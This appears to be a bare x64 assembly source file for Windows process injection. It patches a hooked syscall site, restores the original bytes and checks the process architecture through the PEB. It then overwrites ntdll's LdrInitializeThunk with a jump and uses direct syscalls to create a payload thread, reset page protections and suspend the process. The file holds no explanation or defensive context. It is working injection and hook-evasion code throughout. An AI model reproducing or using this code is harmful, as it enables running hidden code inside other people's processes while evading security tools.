;extrn NtSuspendProcess: PROC
;extrn LdrInitializeThunk: PROC
.code
mymemcmp PROC
	push rsi
	push rdi
	mov rsi, rcx
	mov rdi, rdx
	mov rcx, r8
	cld
	cmp rcx, rcx
	repe cmpsb
	setz al
	pop rdi
	pop rsi
	ret
mymemcmp ENDP

.data
injectionCode PROC
	db 0E8h
	dd 0BBBBBBBBh
injectionCode ENDP

;fpBootstrapRoutine PROC
bootstrapRoutineBegin PROC
bootstrapRoutineBegin ENDP
	push rbx
	mov rax, qword ptr [rsp+8]
	sub rax, 5
	mov qword ptr [rsp+8], rax
	dw 0BB48h	;movabs rbx, ?
originalSyscallCode PROC
		dq 0CCCCCCCCCCCCCCCCh
originalSyscallCode ENDP
	lock xchg qword ptr [rax], rbx
	xor rax, rax
	mov rax, qword ptr gs:[rax+60h]
	mov rax, qword ptr [rax+10h]
	mov ebx, dword ptr [rax+3Ch]
	add rax, rbx
	pop rbx
	cmp word ptr [rax+4], 8664h
	jne iswow64
	cmp word ptr [rax+18h], 20Bh
	je isamd64
iswow64:
	;ret
isamd64:
	push rcx
	push rdx
	push r8
	push r9
	sub rsp, 20h
	;lea rcx, NtSuspendProcess ;(this is Not pic code!)
	;int 3
	;or r10,-1
	;mov eax, 161h
	call fpCreatePayloadThread
	;syscall
	;looooop:
	;jmp looooop

	add rsp, 20h
	pop r9
	pop r8
	pop rdx
	pop rcx
	ret
;fpBootstrapRoutine ENDP

syscallStub PROC
	mov eax, ecx
	mov r10, rdx
	mov rdx, r8
	mov r8, r9
	mov r9, qword ptr [rsp+28h]
	add rsp, 8h
	nop
	syscall
	sub rsp, 8h
	ret
syscallStub ENDP

fpCreatePayloadThread PROC
createPayloadThreadBegin PROC
createPayloadThreadBegin ENDP
	mov r11, rsp
	sub rsp, 68h
	xor eax, eax
	lea rdx, [r11+10h]
	mov qword ptr [r11-10h], rax
	xor r9d, r9d
	mov qword ptr [r11-18h], rax
	mov r8d, 1fffffh
	mov qword ptr [r11-20h], rax
	mov qword ptr [r11-28h], rax
	mov qword ptr [r11-30h], rax
	or rax, -1
	mov qword ptr [r11-38h], rax
	mov qword ptr [r11-48h], rax
	mov rcx, qword ptr [ldrInitializeThunkAddr]
	lea rax, looop
	sub rax, rcx
	sub rax, 5
	mov byte ptr [r11-40h], 0E9h
	mov dword ptr [r11-3Fh], eax
	mov rax, rcx
	mov rcx, qword ptr [rcx]
	mov qword ptr [originalLdrInitThunk], rcx
	mov rcx, qword ptr [r11-40h]
	lock xchg qword ptr [rax], rcx
	db 0B9h
ntCreateThreadExNumber PROC
	dd 0DDDDDDDDh
ntCreateThreadExNumber ENDP
	call syscallStub
	add rsp, 68h
	ret
fpCreatePayloadThread ENDP
createPayloadThreadEnd PROC
createPayloadThreadEnd ENDP
ldrInitializeThunkAddr PROC
	dq 0CCCCCCCCCCCCCCCCh	;;&ntdll!LdrInitializeThunk
ldrInitializeThunkAddr ENDP
ntdllRxBasePriv:
ntdllRxBaseAddr PROC
	dq 1111111111111111h	;;pNtdllRxBase
ntdllRxBaseAddr ENDP
protSizePriv:
protSize PROC
	dq 5555555555555555h	;;bytesToProtect
protSize ENDP
origProtPriv:
origProt PROC
	dd 44444444h			;;oldProt
origProt ENDP
	originalLdrInitThunk dq 9999999999999999h
looop:
	mov rax, qword ptr [originalLdrInitThunk]
	mov rcx, qword ptr [ldrInitializeThunkAddr]
	lock xchg qword ptr [rcx], rax
	sub rsp, 50h
	or rdx, -1
	mov rax, qword ptr [ntdllRxBasePriv]
	mov [rsp+38h], rax
	lea r8, [rsp+38h]
	mov rax, qword ptr [protSizePriv]
	mov [rsp+40h], rax
	lea r9, [rsp+40h]
	mov ecx, dword ptr [origProtPriv]
	mov dword ptr [rsp+20h], ecx
	lea rcx, [rsp+30h]
	mov qword ptr [rsp+28h], rcx
	db 0B9h
ntProtectVirtMemNumber PROC
	dd 033333333h			;;((PNT_SYSCALL_STUB)&NtProtectVirtualMemory)->syscallNr
ntProtectVirtMemNumber ENDP
	call syscallStub
	add rsp, 50h
	;status = NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, PAGE_EXECUTE_READWRITE, &oldHookProtect);
	;int 3
	or r10,-1
	mov eax, 161h
	syscall
loooop:
	jmp loooop
bootstrapRoutineEnd PROC
bootstrapRoutineEnd ENDP
;fpCreatePayloadThread:
END
